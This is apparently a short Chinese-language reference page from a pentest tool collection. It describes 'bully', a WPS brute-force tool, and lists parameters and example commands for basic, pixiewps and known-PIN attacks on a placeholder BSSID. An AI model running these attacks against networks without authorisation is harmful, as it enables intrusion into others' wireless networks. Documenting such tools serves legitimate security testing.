# bully

## 简介
另一个 WPS 暴力破解工具

## 核心参数
- `-b`: 目标 BSSID
- `-c`: 信道

## 命令示例
```bash
# 基本 WPS 攻击
bully wlan0mon -b 00:11:22:33:44:55 -c 6

# 详细输出
bully wlan0mon -b 00:11:22:33:44:55 -c 6 -v 3

# 使用 pixiewps 攻击
bully wlan0mon -b 00:11:22:33:44:55 -c 6 -d

# 使用已知 PIN
bully wlan0mon -b 00:11:22:33:44:55 -c 6 -p 12345670
```

## 使用场景
reaver 的替代品，某些场景下更稳定

## 所属分类
- [WiFi 攻击 (WiFi Attacks)](../categories/24-wifi-attacks.md)
